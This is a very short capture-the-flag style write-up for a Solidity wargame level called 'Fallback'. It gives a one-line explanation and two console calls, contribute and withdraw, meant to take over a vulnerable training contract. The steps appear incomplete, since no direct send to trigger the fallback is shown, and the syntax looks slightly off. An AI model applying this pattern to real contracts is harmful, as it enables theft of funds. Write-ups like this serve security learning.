# Day 1 - Fallback

Abusing erroneous logic between contract functions and fallback function.

```sol
await contract.contribute().sendTransaction({value: 0.005});
await contract.withdraw();
```
